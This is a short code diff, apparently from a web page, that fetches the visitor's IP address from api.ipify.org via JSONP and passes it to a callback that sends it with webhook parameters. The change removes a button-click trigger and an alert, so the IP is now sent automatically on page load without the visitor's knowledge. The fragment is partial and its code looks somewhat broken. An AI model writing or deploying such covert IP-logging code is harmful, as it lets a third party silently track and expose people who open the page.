@@ -13,13 +13,8 @@ function getIP(json) {
       }
       
    //just a webhook parameters such as avatar,name,message
-var btn = document.getElementById("mybtn")
-btn.addEventListener("click", getIP.request.send(JSON.stringify(params)))
+
+getIP.request.send(JSON.stringify(params));
 
     }
-
-    function alertMe(){
-        alert("The button has been clicked!");
-}
-
 <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
